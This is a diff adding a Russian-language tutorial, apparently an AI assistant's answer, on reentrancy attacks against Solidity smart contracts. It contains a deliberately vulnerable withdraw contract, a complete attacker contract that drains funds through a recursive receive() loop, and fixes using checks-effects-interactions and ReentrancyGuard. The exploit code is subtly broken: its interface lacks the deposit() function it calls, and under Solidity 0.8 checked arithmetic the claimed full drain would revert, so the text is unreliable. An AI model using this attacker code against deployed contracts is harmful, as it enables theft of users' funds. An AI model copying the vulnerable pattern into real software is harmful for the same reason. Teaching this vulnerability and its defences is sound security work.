@@ -1,0 +1,135 @@
+Конечно! Вот пошаговое описание того, как может произойти **атака повторного входа
+(reentrancy attack)**:
+
+### **Шаг 1: Уязвимый контракт**
+
+Предположим, у вас есть простой смарт-контракт для вывода средств:
+
+```solidity
+pragma solidity ^0.8.0;
+
+contract VulnerableContract {
+    mapping(address => uint256) public balances;
+
+    // Функция для депозита
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    // Уязвимая функция вывода
+    function withdraw(uint256 _amount) external {
+        require(balances[msg.sender] >= _amount, "Недостаточно средств");
+
+        // Отправка средств
+        (bool success, ) = msg.sender.call{value: _amount}("");
+        require(success, "Перевод не удался");
+
+        // Обновление баланса
+        balances[msg.sender] -= _amount;
+    }
+}
+```
+
+**Проблема:** В функции `withdraw` сначала отправляются средства, а затем обновляется баланс.
+
+Это позволяет злоумышленнику вызвать функцию повторно до обновления баланса.
+
+### **Шаг 2: Создание атакующего контракта**
+
+Злоумышленник разрабатывает контракт, который будет эксплуатировать уязвимость:
+
+```solidity
+pragma solidity ^0.8.0;
+
+interface IVulnerableContract {
+    function withdraw(uint256 _amount) external;
+}
+
+contract Attacker {
+    IVulnerableContract public vulnerable;
+    address public owner;
+
+    constructor(address _vulnerableAddress) {
+        vulnerable = IVulnerableContract(_vulnerableAddress);
+        owner = msg.sender;
+    }
+
+    // Функция для получения депозита
+    receive() external payable {
+        if (address(vulnerable).balance >= 1 ether) {
+            vulnerable.withdraw(1 ether);
+        }
+    }
+
+    // Начало атаки
+    function attack() external payable {
+        require(msg.value >= 1 ether);
+        vulnerable.deposit{value: 1 ether}();
+        vulnerable.withdraw(1 ether);
+    }
+
+    // Функция для вывода средств атакующего
+    function collect() external {
+        require(msg.sender == owner);
+        payable(owner).transfer(address(this).balance);
+    }
+}
+```
+
+### **Шаг 3: Проведение атаки**
+
+1. **Депозит:** Атакующий вызывает функцию `attack`, отправляя 1 эфир. Это вызывает `deposit` в
+уязвимом контракте, увеличивая баланс атакующего.
+
+2. **Вывод:** Затем атакующий вызывает `withdraw(1 ether)`. В уязвимом контракте проверяется
+баланс и отправляется 1 эфир.
+
+3. **Повторный вызов через `receive`:** При получении эфира, функция `receive` в атакующем
+контракте автоматически вызывается. Внутри `receive` снова вызывается `withdraw(1 ether)` до того,
+как баланс в уязвимом контракте обновится.
+
+4. **Цикличный вывод:** Этот процесс повторяется, пока баланс уязвимого контракта позволяет,
+позволяя атакующему вывести больше средств, чем он изначально вложил.
+
+### **Итоговый результат**
+
+Атакующий смог многократно вызвать функцию `withdraw` до обновления баланса, что привело к выводу
+всех средств из уязвимого контракта.
+
+### **Как предотвратить атаку**
+
+1. **Проверка баланса перед отправкой:** Всегда обновляйте состояние контракта перед выполнением
+внешних вызовов.
+
+    ```solidity
+    function withdraw(uint256 _amount) external {
+        require(balances[msg.sender] >= _amount, "Недостаточно средств");
+        balances[msg.sender] -= _amount;
+        (bool success, ) = msg.sender.call{value: _amount}("");
+        require(success, "Перевод не удался");
+    }
+    ```
+
+2. **Использование модификатора `nonReentrant`:** Применяйте паттерн "проверка-эффект-взаимодействие"
+или используйте библиотеку `ReentrancyGuard` от OpenZeppelin.
+
+    ```solidity
+    import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+
+    contract SecureContract is ReentrancyGuard {
+        // ...
+
+        function withdraw(uint256 _amount) external nonReentrant {
+            require(balances[msg.sender] >= _amount, "Недостаточно средств");
+            balances[msg.sender] -= _amount;
+            (bool success, ) = msg.sender.call{value: _amount}("");
+            require(success, "Перевод не удался");
+        }
+    }
+    ```
+
+### **Заключение**
+
+Атака повторного входа позволяет злоумышленнику многократно вызывать уязвимую функцию до
+завершения её выполнения, что может привести к значительным потерям. Важно соблюдать лучшие
+практики разработки смарт-контрактов, чтобы защититься от подобных атак.
